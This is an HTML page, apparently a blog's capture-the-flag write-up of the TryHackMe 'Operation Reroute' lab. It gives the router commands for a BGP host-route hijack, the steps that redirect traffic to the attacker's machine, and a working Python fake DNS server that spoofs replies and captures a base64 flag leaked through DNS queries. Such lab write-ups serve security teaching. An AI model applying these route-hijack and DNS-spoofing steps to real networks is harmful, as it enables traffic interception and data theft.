@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="TryHackMe Operation Reroute walkthrough covering BGP route hijacking, traffic redirection, DNS impersonation, and DNS exfiltration." />
+  <title>Operation Reroute | Yoinked by Yoinkas</title>
+  <link rel="stylesheet" href="../assets/styles.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="../assets/writeup-studio.css" />
+</head>
+<body class="ws-doc">
+  <header class="site-header"><div class="container"><a class="logo" href="../index.html">Yoinked by Yoinkas</a><nav class="nav"><a href="../cybersecurity.html">CyberSecurity</a><a href="../hacking.html">Hacking</a><a href="index.html">Writeups</a></nav></div></header>
+  <main><section class="section"><article class="container post">
+    <p class="meta">TryHackMe &middot; Hard &middot; Linux</p>
+    <h1>Operation Reroute</h1>
+    <figure><img src="../assets/reroute.png" alt="Operation Reroute network-routing graphic" /></figure>
+    <div class="info-grid"><div><h3>Quick facts</h3><ul><li>Difficulty: Hard</li><li>OS: Linux</li><li>Techniques: BGP route hijacking and DNS exfiltration</li></ul></div></div>
+
+    <h2>Overview</h2>
+    <p>I logged into a router and made it advertise a specific IP address to other network devices, then changed the router's forwarding so traffic for that IP went to my Kali machine instead of its original destination. I also assigned that IP to my machine so it would accept the traffic and ran a fake DNS server that logged any DNS requests arriving there.</p>
+    <p>A victim machine then sent DNS queries for a domain whose first label was base64-encoded data. My fake DNS server captured those query names. Decoding the base64 revealed the flag. In short: I hijacked traffic for an IP, impersonated a DNS server, and captured data the victim was leaking through DNS queries.</p>
+
+    <h2>1. Connect to the FRRouting router</h2>
+    <pre><code>ssh ttm@192.168.1.1</code></pre>
+    <p>After authentication, the SSH session opened directly in the FRRouting <code>vtysh</code> interface on <code>TTM-CORE-01</code>.</p>
+
+    <h2>2. Advertise the target host route</h2>
+    <pre><code>configure terminal
+ip route 10.10.10.10/32 eth2
+ip prefix-list bgp-out seq 30 permit 10.10.10.10/32
+router bgp 1111
+address-family ipv4 unicast
+network 10.10.10.10/32
+exit-address-family
+exit
+end
+write</code></pre>
+    <p>This created a route for <code>10.10.10.10/32</code>, permitted it through the outbound BGP prefix list, and originated the host route from AS 1111.</p>
+
+    <h2>3. Verify the BGP advertisement</h2>
+    <pre><code>show ip bgp 10.10.10.10/32
+show ip bgp neighbors 10.1.1.2 advertised-routes</code></pre>
+    <p>The first command showed the route as locally sourced and selected as the best path. The neighbor output confirmed that <code>10.10.10.10/32</code> was being advertised to <code>10.1.1.2</code>.</p>
+
+    <h2>4. Redirect the route to Kali</h2>
+    <pre><code>configure terminal
+no ip route 10.10.10.10/32 eth2
+ip route 10.10.10.10/32 192.168.1.100
+end
+write
+show ip route 10.10.10.10/32</code></pre>
+    <p>I replaced the original forwarding path with my Kali address. The route table then showed <code>10.10.10.10/32</code> forwarding through <code>192.168.1.100</code> on <code>eth0</code>.</p>
+
+    <h2>5. Assign the hijacked address to Kali</h2>
+    <pre><code>ip addr add 10.10.10.10/32 dev eth0
+ip addr show eth0</code></pre>
+    <p>Adding the target address to <code>eth0</code> allowed Kali to accept traffic sent to the hijacked IP.</p>
+
+    <h2>6. Run a DNS listener</h2>
+    <pre><code>cat &gt; /tmp/dns_listener.py &lt;&lt;'PY'
+import socket
+
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s.bind(("0.0.0.0", 53))
+print("[+] DNS listener on UDP/53 - waiting...")
+
+while True:
+    data, addr = s.recvfrom(512)
+    i = 12
+    labels = []
+    while data[i] != 0:
+        length = data[i]
+        labels.append(data[i + 1:i + 1 + length].decode(errors="replace"))
+        i += 1 + length
+    qname = ".".join(labels)
+    print(f"[DNS] {addr[0]} -&gt; {qname}")
+
+    tid = data[:2]
+    question = data[12:i + 5]
+    answer = (b"\xc0\x0c" + b"\x00\x01" + b"\x00\x01" +
+              b"\x00\x00\x00\x3c" + b"\x00\x04" +
+              socket.inet_aton("10.10.10.10"))
+    response = (tid + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00" +
+                question + answer)
+    s.sendto(response, addr)
+PY
+
+python3 /tmp/dns_listener.py</code></pre>
+    <p>The listener parsed incoming DNS question names, printed them, and returned an A record pointing back to the impersonated address.</p>
+
+    <h2>7. Capture and decode the exfiltrated data</h2>
+    <pre><code>[DNS] 192.168.2.100 -&gt; VEhNe0JHUF9pc19teV9taWRkbGVfbmFtZX0K.flag.sekureapp.thm
+
+echo 'VEhNe0JHUF9pc19teV9taWRkbGVfbmFtZX0K' | base64 -d</code></pre>
+    <p>The victim repeatedly queried a subdomain containing a base64 value. Decoding the first label produced:</p>
+    <pre><code>THM{BGP_is_my_middle_name}</code></pre>
+
+    <h2>Attack chain</h2>
+    <pre><code>SSH to FRRouting
+-&gt; originate 10.10.10.10/32 in BGP
+-&gt; advertise the more-specific route
+-&gt; forward the route to Kali
+-&gt; bind 10.10.10.10/32 on Kali
+-&gt; impersonate DNS on UDP/53
+-&gt; capture the victim's query
+-&gt; decode the base64 label</code></pre>
+
+    <h2>Key lesson</h2>
+    <p>A more-specific route can redirect traffic even when a broader legitimate route exists. Once that traffic reaches an attacker-controlled host, impersonating the expected UDP service can expose application data&mdash;in this case, data deliberately carried inside DNS labels.</p>
+  </article></section></main>
+  <footer class="site-footer"><div class="container"><p>Yoinked by Yoinkas | Security writeups</p></div></footer>
+</body>
+</html>
